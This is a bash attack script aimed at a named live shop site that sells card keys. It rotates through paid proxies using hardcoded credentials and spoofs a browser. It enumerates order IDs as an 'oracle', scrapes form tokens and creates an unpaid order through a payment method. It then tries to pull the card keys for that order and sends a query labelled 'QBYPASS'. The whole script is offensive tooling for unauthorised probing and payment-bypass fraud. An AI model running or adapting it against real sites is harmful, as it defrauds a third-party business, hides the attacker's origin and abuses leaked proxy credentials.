#!/bin/bash
# tjqq: Query_Km oracle + udpay order create + kami path
set -u
KEY=C413ED6D; PWD=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://tjqq.top
CK=/tmp/tjqq5.ck
OUT=/tmp/tjqq5_out
LOG=/tmp/tjqq5.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --connect-timeout 5 --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 5 --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }

for i in 1 2 3 4 5 6 7 8; do
  refresh
  code=$(curl -sk --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo "=== Query_Km message oracle ==="
for id in 1 2 3 10 100 999 1000 5000 10000 50000 99999 100000 \
  000000000001 000000000100 000000001000 000000010000 \
  20260701000000001 20260801000000001 20260803000000001; do
  code=$(c -o "$OUT/qm.html" -w "%{http_code}:%{size_download}" "$BASE/Query_Km/$id")
  python3 -c "
import re,sys,hashlib
h=open('/tmp/tjqq5_out/qm.html',encoding='utf-8',errors='ignore').read()
text=re.sub(r'\s+',' ', re.sub(r'<[^>]+>',' ',h))
# jump tip message often in .jump or h1/p
msgs=re.findall(r'(订单[^<]{0,40}|不存在|未支付|未付款|已付款|卡密|成功|失败|错误|无效)[^。]{0,30}', h)
print(sys.argv[1], sys.argv[2], 'md5', hashlib.md5(h.encode()).hexdigest()[:10], 'msgs', msgs[:5], 'text', text[text.find('跳转'):text.find('跳转')+80] if '跳转' in text else text[:120])
" "$id" "$code"
done

echo "=== create udpay order ==="
c "$BASE/Trade/56.html" -o "$OUT/trade.html" -w "trade=%{http_code}:%{size_download}\n"
python3 - <<'PY'
import re
h=open('/tmp/tjqq5_out/trade.html',encoding='utf-8',errors='ignore').read()
print('len', len(h))
tok=re.search(r'name="__token__"\s+value="([^"]+)"',h)
print('token', tok.group(1) if tok else None)
print('gid fields', re.findall(r'gid[^>\n]{0,80}', h)[:10])
print('paytype', re.findall(r'paytype[^>\n]{0,100}', h)[:15])
print('pass', re.findall(r'name="pass"[^>]*>', h))
# full form
m=re.search(r'<form[\s\S]*?</form>', h)
print('FORM', m.group(0)[:1500] if m else None)
if tok: open('/tmp/tjqq5_out/tok.txt','w').write(tok.group(1))
PY
TOK=$(cat "$OUT/tok.txt")
PASS=tjkami$(date +%H%M%S)
echo PASS=$PASS TOK=$TOK

# POST Pay with udpay
c -D "$OUT/pay.hdr" -o "$OUT/pay.html" -w "PAY=%{http_code}:%{size_download}:%{url_effective}\n" \
  -H 'Content-Type: application/x-www-form-urlencoded' -e "$BASE/Trade/56.html" -X POST \
  --data-urlencode "paytype=udpay" \
  --data-urlencode "gid=56" \
  --data-urlencode "count=1" \
  --data-urlencode "pass=$PASS" \
  --data-urlencode "__token__=$TOK" \
  "$BASE/Pay"
echo "=== PAY HDR ==="
cat "$OUT/pay.hdr"
echo "=== PAY BODY ==="
python3 - <<'PY'
import re
h=open('/tmp/tjqq5_out/pay.html',encoding='utf-8',errors='ignore').read()
print('len', len(h))
print(h[:2000])
text=re.sub(r'\s+',' ', re.sub(r'<[^>]+>',' ',h))
print('TEXT', text[:800])
# extract order id / links
print('links', re.findall(r'href=["\']([^"\']+)["\']', h)[:20])
print('nums', re.findall(r'\d{10,20}', h)[:20])
print('Query_Km', re.findall(r'Query_Km/[^"\'\s]+', h))
print('R_YkPay', re.findall(r'R_YkPay/[^"\'\s]+', h))
open('/tmp/tjqq5_out/pay_text.txt','w').write(text)
PY

# If jump page with meta refresh / js location
ORDER=$(python3 -c "
import re
h=open('/tmp/tjqq5_out/pay.html',encoding='utf-8',errors='ignore').read()
hdr=open('/tmp/tjqq5_out/pay.hdr',encoding='utf-8',errors='ignore').read()
for src in [hdr,h]:
  m=re.search(r'Query_Km/([0-9A-Za-z]+)', src) or re.search(r'R_YkPay/([0-9A-Za-z]+)', src) or re.search(r'orderid[=/](\d+)', src, re.I)
  if m:
    print(m.group(1)); break
  m=re.search(r'location\.href\s*=\s*[\'\"]([^\'\"]+)', src)
  if m:
    print('URL:'+m.group(1)); break
")
echo ORDER_EXTRACT=$ORDER

# follow udpay page patterns
for p in \
  "/Pay" \
  "/udpay" \
  "/Udpay" \
  "/Pay_Udpay.html" \
  "/Usdt.html" \
  "/USDT.html"; do
  code=$(c -o "$OUT/x.html" -w "%{http_code}:%{size_download}" "$BASE$p")
  echo "P $p => $code"
done

# If we got order id, check Query_Km and R_YkPay
if [[ -n "$ORDER" && "$ORDER" != URL:* ]]; then
  echo "=== follow order $ORDER ==="
  c "$BASE/Query_Km/$ORDER" -o "$OUT/qm_order.html" -w "qm=%{http_code}:%{size_download}\n"
  python3 -c "
import re
h=open('/tmp/tjqq5_out/qm_order.html',encoding='utf-8',errors='ignore').read()
print(re.sub(r'\s+',' ', re.sub(r'<[^>]+>',' ',h))[:1000])
print('kami', re.findall(r'卡密|卡号|----|[A-Za-z0-9]{16,}', h)[:20])
"
  c "$BASE/R_YkPay/$ORDER" -o "$OUT/ryk.html" -w "ryk=%{http_code}:%{size_download}\n"
  echo RYK=$(cat "$OUT/ryk.html")
fi

# Also try home Get_Yk_KC with proper content-type / referer from scraped JS
python3 - <<'PY'
import re
h=open('/tmp/tjqq5_out/home.html',encoding='utf-8',errors='ignore').read()
# find ajax data block
idx=h.find('Get_Yk_KC')
print(h[max(0,idx-100):idx+400])
PY
r=$(c -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -e "$BASE/" -X POST --data 'ddid%5B%5D=56&ddid%5B%5D=65&ddid%5B%5D=43&ddid%5B%5D=55' "$BASE/Get_Yk_KC.html")
echo "KC_PROPER => ${r:0:500}"

echo "=== Query.html token submit ==="
c "$BASE/Query.html" -o "$OUT/query.html"
python3 - <<'PY'
import re
h=open('/tmp/tjqq5_out/query.html',encoding='utf-8',errors='ignore').read()
tok=re.search(r'name="__token__"\s+value="([^"]+)"',h)
print('qtok', tok.group(1) if tok else None)
print('form', re.search(r'<form[\s\S]*?</form>',h).group(0)[:1200] if re.search(r'<form',h) else None)
# JS
for m in re.finditer(r'\$\.ajax\([\s\S]{0,500}?\)|layui\.form\.on\([\s\S]{0,800}?\)', h):
  print('AJAX', m.group(0)[:500])
if tok: open('/tmp/tjqq5_out/qtok.txt','w').write(tok.group(1))
PY
QTOK=$(cat "$OUT/qtok.txt" 2>/dev/null || true)
# use pass from our order attempt
r=$(c -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/x-www-form-urlencoded' \
  -e "$BASE/Query.html" -X POST \
  --data-urlencode "value=$PASS" --data-urlencode "pass=$PASS" --data-urlencode "__token__=$QTOK" --data-urlencode "page=1" \
  "$BASE/Query.html")
echo "QBYPASS => ${r:0:500}"

echo "===== PROBE5 DONE ====="
ls -la "$OUT" | head
